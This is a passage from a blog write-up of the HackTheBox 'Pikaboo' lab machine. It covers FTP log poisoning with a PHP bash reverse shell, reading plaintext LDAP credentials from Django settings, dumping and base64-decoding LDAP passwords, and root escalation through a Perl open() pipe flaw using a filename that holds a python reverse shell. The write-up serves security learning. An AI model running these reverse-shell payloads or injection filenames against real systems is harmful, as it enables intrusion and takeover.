</span></span><span style="display:flex"><span>Name <span style="color:#f92672">(</span>10.10.10.249:zebra<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;&lt;?php exec(&#34;/bin/bash -c &#39;</span>bash -i &gt; /dev/tcp/10.10.14.100/6666 0&gt;&amp;1<span style="color:#e6db74">&#39;&#34;); ?&gt;&#39;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">331</span> Please specify the password.
</span></span><span style="display:flex"><span>Password:
</span></span><span style="display:flex"><span><span style="color:#ae81ff">530</span> Login incorrect.
</span></span><span style="display:flex"><span>ftp: Login failed.
</span></span><span style="display:flex"><span>ftp&gt;
</span></span></code></pre></div><p>Just listen with netcat and reload the page, and we will have
<strong>www-data</strong>!</p><p>There is <code>python3</code> installed, so we can upgrade the shell.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>And we will have an upgraded shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pikaboo:/var/www/html/admin_staging$
</span></span></code></pre></div><p>You can now grab the <strong>user flag</strong> from the <code>pwnmeow</code> home dir.</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>As the page said, there is a <code>pokeapi</code> thing under development. We can
do a quick search:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>find / -name <span style="color:#e6db74">&#39;*pokeapi*&#39;</span> 2&gt;/dev/null
</span></span></code></pre></div><p>And we get some interesting results.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>/run/pokeapi
</span></span><span style="display:flex"><span>/var/www/html/pokatdex/pokeapi.php
</span></span><span style="display:flex"><span>/etc/systemd/system/pokeapi.service
</span></span><span style="display:flex"><span>/etc/tmpfiles.d/pokeapi.conf
</span></span><span style="display:flex"><span>/opt/pokeapi
</span></span></code></pre></div><p>We can see some source code in <code>/opt/pokeapi</code>. Inside the config folder,
there is a <code>settings.py</code> file which contains some interesting
information:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span>DATABASES <span style="color:#f92672">=</span> {
</span></span><span style="display:flex"><span>    <span style="color:#e6db74">&#34;ldap&#34;</span>: {
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;ENGINE&#34;</span>: <span style="color:#e6db74">&#34;ldapdb.backends.ldap&#34;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;NAME&#34;</span>: <span style="color:#e6db74">&#34;ldap:///&#34;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;USER&#34;</span>: <span style="color:#e6db74">&#34;cn=binduser,ou=users,dc=pikaboo,dc=htb&#34;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;PASSWORD&#34;</span>: <span style="color:#e6db74">&#34;J~42%W?PFHl]g&#34;</span>,
</span></span><span style="display:flex"><span>    },
</span></span><span style="display:flex"><span>    <span style="color:#e6db74">&#34;default&#34;</span>: {
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;ENGINE&#34;</span>: <span style="color:#e6db74">&#34;django.db.backends.sqlite3&#34;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;NAME&#34;</span>: <span style="color:#e6db74">&#34;/opt/pokeapi/db.sqlite3&#34;</span>,
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>}
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>CACHES <span style="color:#f92672">=</span> {
</span></span><span style="display:flex"><span>    <span style="color:#e6db74">&#34;default&#34;</span>: {
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;BACKEND&#34;</span>: <span style="color:#e6db74">&#34;django_redis.cache.RedisCache&#34;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;LOCATION&#34;</span>: <span style="color:#e6db74">&#34;redis://127.0.0.1:6379/1&#34;</span>,
</span></span><span style="display:flex"><span>        <span style="color:#e6db74">&#34;OPTIONS&#34;</span>: {
</span></span><span style="display:flex"><span>            <span style="color:#e6db74">&#34;CLIENT_CLASS&#34;</span>: <span style="color:#e6db74">&#34;django_redis.client.DefaultClient&#34;</span>,
</span></span><span style="display:flex"><span>        },
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>}
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>SECRET_KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(
</span></span><span style="display:flex"><span>    <span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>, <span style="color:#e6db74">&#34;ubx+22!jbo(^x2_scm-o$*py3e@-awu-n^hipkm%2l$sw$&amp;2l#&#34;</span>
</span></span><span style="display:flex"><span>)
</span></span></code></pre></div><p>First of all, it is running <strong>ldap</strong>. There is also a plain text
password there. As we have a password, we may try with <code>ldapsearch</code> with
the following parameters:</p><pre tabindex="0"><code>-x Simple Authentication
-h LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
</code></pre><p>We can infer the parameters from the config above.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ldapsearch -x -h 127.0.0.1 -D<span style="color:#e6db74">&#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39;</span> -w <span style="color:#e6db74">&#39;J~42%W?PFHl]g&#39;</span> -b <span style="color:#e6db74">&#34;dc=pikaboo,dc=htb&#34;</span>
</span></span></code></pre></div><p>We will get some passwords.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#75715e"># pwnmeow, users, ftp.pikaboo.htb</span>
</span></span><span style="display:flex"><span>dn: uid<span style="color:#f92672">=</span>pwnmeow,ou<span style="color:#f92672">=</span>users,dc<span style="color:#f92672">=</span>ftp,dc<span style="color:#f92672">=</span>pikaboo,dc<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex"><span>objectClass: inetOrgPerson
</span></span><span style="display:flex"><span>objectClass: posixAccount
</span></span><span style="display:flex"><span>objectClass: shadowAccount
</span></span><span style="display:flex"><span>uid: pwnmeow
</span></span><span style="display:flex"><span>cn: Pwn
</span></span><span style="display:flex"><span>sn: Meow
</span></span><span style="display:flex"><span>loginShell: /bin/bash
</span></span><span style="display:flex"><span>uidNumber: <span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex"><span>gidNumber: <span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex"><span>homeDirectory: /home/pwnmeow
</span></span><span style="display:flex"><span>userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw<span style="color:#f92672">==</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#75715e"># binduser, users, pikaboo.htb</span>
</span></span><span style="display:flex"><span>dn: cn<span style="color:#f92672">=</span>binduser,ou<span style="color:#f92672">=</span>users,dc<span style="color:#f92672">=</span>pikaboo,dc<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex"><span>cn: binduser
</span></span><span style="display:flex"><span>objectClass: simpleSecurityObject
</span></span><span style="display:flex"><span>objectClass: organizationalRole
</span></span><span style="display:flex"><span>userPassword:: Sn40MiVXP1BGSGxdZw<span style="color:#f92672">==</span>
</span></span></code></pre></div><p>If we decrypt the passwords with <code>base64</code>, we get the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>&gt; echo <span style="color:#e6db74">&#34;X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==&#34;</span> | base64 -d
</span></span><span style="display:flex"><span>_G0tT4_C4tcH_<span style="color:#960050;background-color:#1e0010">&#39;</span>3m_4lL!_
</span></span><span style="display:flex"><span>&gt; echo <span style="color:#e6db74">&#34;Sn40MiVXP1BGSGxdZw==&#34;</span> | base64 -d
</span></span><span style="display:flex"><span>J~42%W?PFHl<span style="color:#f92672">]</span>g
</span></span></code></pre></div><p>There is a new password which seems to be used to log in as <strong>pwnmeow</strong>
in ftp. We can login from outside the reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>&gt; ftp 10.10.10.249
</span></span><span style="display:flex"><span>Connected to 10.10.10.249.
</span></span><span style="display:flex"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>Name <span style="color:#f92672">(</span>10.10.10.249:zebra<span style="color:#f92672">)</span>: pwnmeow
</span></span><span style="display:flex"><span><span style="color:#ae81ff">331</span> Please specify the password.
</span></span><span style="display:flex"><span>Password:
</span></span><span style="display:flex"><span><span style="color:#ae81ff">230</span> Login successful.
</span></span><span style="display:flex"><span>Remote system type is UNIX.
</span></span><span style="display:flex"><span>Using binary mode to transfer files.
</span></span></code></pre></div><p>By investigating the cronjobs, we can see there is one running:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>www-data@pikaboo:/opt/pokeapi$ cat /etc/crontab
</span></span><span style="display:flex"><span>cat /etc/crontab
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
</span></span><span style="display:flex"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
</span></span><span style="display:flex"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>* * * * * root /usr/local/bin/csvupdate_cron
</span></span></code></pre></div><p>If we read the content of the script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">for</span> d in /srv/ftp/*
</span></span><span style="display:flex"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex"><span>  cd $d
</span></span><span style="display:flex"><span>  /usr/local/bin/csvupdate <span style="color:#66d9ef">$(</span>basename $d<span style="color:#66d9ef">)</span> *csv
</span></span><span style="display:flex"><span>  /usr/bin/rm -rf *
</span></span><span style="display:flex"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>The script is being called with the <code>basename</code> of the directory and every file
ending in <code>csv</code> inside, for example: <code>types water.csv</code>. The code of the <code>csvupdate</code> script is in perl.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="display:flex"><span><span style="color:#66d9ef">my</span> $fname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;${csv_dir}/${type}.csv&#34;</span>;
</span></span><span style="display:flex"><span>open(<span style="color:#66d9ef">my</span> $fh, <span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>, $fname) <span style="color:#f92672">or</span> die <span style="color:#e6db74">&#34;Unable to open CSV target file.\\n&#34;</span>;
</span></span></code></pre></div><p>It uses the open function, which documentation shows us a possible flaw:</p><blockquote><p>If the last character is a pipe, then the command is executed and its
standard output is fed into the filehandle where it can be read using
Perl’s file input mechanisms. – “Perl for Perl Newbies” - Part 4</p></blockquote><p>The first arg of the script is appended to the fname variable, but it is
checked so it matches one of the <code>csv_fields</code> map, so we cannot inject
code there.</p><p>The actual vulnerability is in the following lines:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="display:flex"><span>shift;
</span></span><span style="display:flex"><span><span style="color:#66d9ef">for</span>(<span style="color:#f92672">&lt;&gt;</span>)
</span></span><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>In perl, the <code>&lt;&gt;</code> performs an open of the <em>argv</em>. As we mentioned, the
open function can lead to weird behavior if the file name contains a
pipe character.</p><p>For example, the lines above executed like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>perl script *csv
</span></span></code></pre></div><p>inside a directory with the following files (we need to ensure our files
end in <code>csv</code> or they will be ignored by the wildcard):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> zebra zebra    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">18</span> 10:03 water.csv
</span></span><span style="display:flex"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> zebra zebra    <span style="color:#ae81ff">0</span> Nov <span style="color:#ae81ff">18</span> 10:12 |echo test;echo .csv
</span></span></code></pre></div><p>would run the <code>echo test</code> and the <code>echo .csv</code>.</p><p>There is a new double diamond operator (<code>&lt;&lt;&gt;&gt;</code>) to fix this issue, but
it is weird that the default behavior can be exploited that easily.</p><p>Going back to the machine, we are going to setup everything on the host
to perform the exploit. We will create two files, one that is empty
(which I named empty haha) and another one with the reverse shell as
described above.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>touch <span style="color:#e6db74">&#34;|python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;10.10.14.100\\&#34;&#34;,6667));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;sh\\&#34;&#34;)&#39;;.csv&#34;</span>
</span></span><span style="display:flex"><span>touch empty
</span></span></code></pre></div><p>From that dir, we can now connect to the ftp with the credentials we
discovered previously and put the file.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ftp&gt; put
</span></span><span style="display:flex"><span><span style="color:#f92672">(</span>local-file<span style="color:#f92672">)</span> test
</span></span><span style="display:flex"><span><span style="color:#f92672">(</span>remote-file<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;|python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;10.10.14.100\\&#34;&#34;,6667));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;sh\\&#34;&#34;)&#39;;.csv&#34;</span>
</span></span><span style="display:flex"><span><span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
</span></span><span style="display:flex"><span><span style="color:#ae81ff">150</span> Ok to send data.
</span></span><span style="display:flex"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex"><span>ftp&gt;
</span></span></code></pre></div><p>With a netcat listening, we will receive a connection from <strong>root</strong>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#75715e"># whoami</span>
</span></span><span style="display:flex"><span>root
</span></span></code></pre></div><p>And we can now get the <strong>root flag</strong>!</p><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li>Off-By-Slash<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/"><div><div class="bookmark-title">Common Nginx misconfigurations - Blog Detectify</div><div class="bookmark-description">Detectify analyzed 50,000 unique Nginx configuration files on GitHub and reported some common misconfigurations.</div><div class="bookmark-link"><div>https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/</div></div></div><div class="bookmark-image"><img src="https://blogdetectify.cdn.triggerfish.cloud/uploads/2023/01/02125651/NGINX-MISCONFIGURATIONS.png" alt="" loading="lazy"/></div></a></div></li><li>Local File Inclusion<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion"><div><div class="bookmark-title">Page not found - HackTricks</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://book.hacktricks.xyz/pentesting-web/file-inclusion</div></div></div><div class="bookmark-image"></div></a></div></li><li>FTP Log poisoning<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://secnhack.in/ftp-log-poisoning-through-lfi/"><div><div class="bookmark-title">Just a moment...</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://secnhack.in/ftp-log-poisoning-through-lfi/</div></div></div><div class="bookmark-image"></div></a></div></li><li>LDAP enumeration<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://book.hacktricks.xyz/pentesting/pentesting-ldap"><div><div class="bookmark-title">Page not found - HackTricks</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://book.hacktricks.xyz/pentesting/pentesting-ldap</div></div></div><div class="bookmark-image"></div></a></div></li><li><code>open</code> function in perl<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href=""><div><div class="bookmark-title">{map[img: title: url:] Page(/blog/hackthebox_writeup:_pikaboo.md) &lt;nil&gt; bookmark true 4 {0 {0 0}} {0 {0 0}} 16434 { 0 0 0} &lt;nil&gt;}</div><div class="bookmark-description"></div><div class="bookmark-link"></div></div><div class="bookmark-image"></div></a></div></li><li>Diamond Operator in perl<div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://stackoverflow.com/questions/12275408/whats-the-use-of-in-perl"><div><div class="bookmark-title">What&#39;s the use of &lt;&gt; in Perl?</div><div class="bookmark-description">What&#39;s the use of &amp;lt;&gt; in Perl. How to use it ?
If we simply write
&amp;lt;&amp;gt;;
and
while(&amp;lt;&amp;gt;)
what is that the program doing in both cases?</div><div class="bookmark-link"><div>https://stackoverflow.com/questions/12275408/whats-the-use-of-in-perl</div></div></div><div class="bookmark-image"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="" loading="lazy"/></div></a></div><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://metacpan.org/pod/Iterator::Diamond"><div><div class="bookmark-title">Iterator::Diamond</div><div class="bookmark-description">Iterate through the files from ARGV</div><div class="bookmark-link"><div>https://metacpan.org/pod/Iterator::Diamond</div></div></div><div class="bookmark-image"><img src="https://metacpan.org/static/images/dots.png" alt="" loading="lazy"/></div></a></div></li></ul></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Pikaboo on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Pikaboo&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Pikaboo on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f&amp;title=HackTheBox%20Writeup%3a%20Pikaboo&amp;summary=HackTheBox%20Writeup%3a%20Pikaboo&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Pikaboo on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f&amp;title=HackTheBox%20Writeup%3a%20Pikaboo"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Pikaboo on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Pikaboo on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Pikaboo%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Pikaboo on telegram" 